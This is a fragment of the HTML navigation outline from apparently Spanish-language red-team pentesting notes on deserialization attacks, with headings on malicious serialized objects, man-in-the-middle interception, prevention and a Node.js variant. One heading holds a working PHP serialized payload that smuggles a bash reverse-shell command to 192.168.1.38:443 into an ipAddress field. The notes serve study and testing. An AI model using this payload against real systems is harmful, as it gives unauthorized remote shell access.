class="tree-item-title">Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Realizar_un_ataque_de_**man-in-the-middle**_para_interceptar_y_modificar_el_objeto_serializado_antes_de_que_llegue_a_la_aplicación."><div class="tree-item-contents heading-link" heading-name="Realizar un ataque de **man-in-the-middle** para interceptar y modificar el objeto serializado antes de que llegue a la aplicación."><span class="tree-item-title">Realizar un ataque de <strong>man-in-the-middle</strong> para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Evitar_estos_ataques"><div class="tree-item-contents heading-link" heading-name="Evitar estos ataques"><span class="tree-item-title">Evitar estos ataques</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Explotación"><div class="tree-item-contents heading-link" heading-name="Explotación"><span class="tree-item-title">Explotación</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="5"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#`O:8:&quot;pingTest&quot;:3:{s:9:&quot;ipAddress&quot;;s:53:&quot;;_bash_-c_'bash_-i_>&amp;_/dev/tcp/192.168.1.38/443_0>&amp;1'&quot;;s:7:&quot;isValid&quot;;b:1;s:6:&quot;output&quot;;s:0:&quot;&quot;;}`"><div class="tree-item-contents heading-link" heading-name="`O:8:&quot;pingTest&quot;:3:{s:9:&quot;ipAddress&quot;;s:53:&quot;; bash -c 'bash -i >&amp; /dev/tcp/192.168.1.38/443 0>&amp;1'&quot;;s:7:&quot;isValid&quot;;b:1;s:6:&quot;output&quot;;s:0:&quot;&quot;;}`"><span class="tree-item-title"><code>O:8:"pingTest":3:{s:9:"ipAddress";s:53:"; bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.38/443 0&gt;&amp;1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}</code></span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\linux\deserialization-attack-(ataques-de-deserialización).html#Nodejs_Deserialization_attack_(unserialize)"><div class="tree-item-contents heading-link" heading-name="Nodejs Deserialization attack (unserialize)"><span class="tree-item-title">Nodejs Deserialization attack (unserialize)</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>